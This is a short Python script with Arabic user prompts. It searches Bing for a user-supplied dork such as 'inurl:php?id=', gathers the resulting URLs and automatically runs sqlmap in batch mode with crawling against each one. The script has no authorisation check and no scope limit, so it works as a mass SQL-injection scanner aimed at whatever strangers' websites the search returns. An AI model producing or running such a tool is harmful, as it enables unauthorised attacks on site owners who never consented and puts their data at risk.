import requests
from bs4 import BeautifulSoup
import subprocess
import time

def search_bing(dork, max_results=20):
    headers = {"User-Agent": "Mozilla/5.0"}
    urls = []
    for page in range(0, max_results, 10):
        url = f"https://www.bing.com/search?q={dork}&first={page+1}"
        resp = requests.get(url, headers=headers)
        soup = BeautifulSoup(resp.text, "html.parser")
        for h2 in soup.find_all("h2"):
            a = h2.find("a")
            if a and a['href'].startswith("http"):
                urls.append(a['href'])
        time.sleep(1)
    return urls

def run_sqlmap(url):
    print(f"\n[+] اختبار الرابط: {url}")
    cmd = ["sqlmap", "-u", url, "--batch", "--crawl=1", "--level=1", "--risk=1"]
    try:
        subprocess.run(cmd)
    except Exception as e:
        print(f"خطأ أثناء تشغيل sqlmap: {e}")

if __name__ == "__main__":
    dork = input("أدخل Google Dork (مثال: inurl:php?id=): ")
    print("\n[+] البحث عن روابط...")
    results = search_bing(dork)
    print(f"\n[+] تم العثور على {len(results)} رابط:")
    for i, url in enumerate(results, 1):
        print(f"{i}. {url}")
    for url in results:
        run_sqlmap(url)
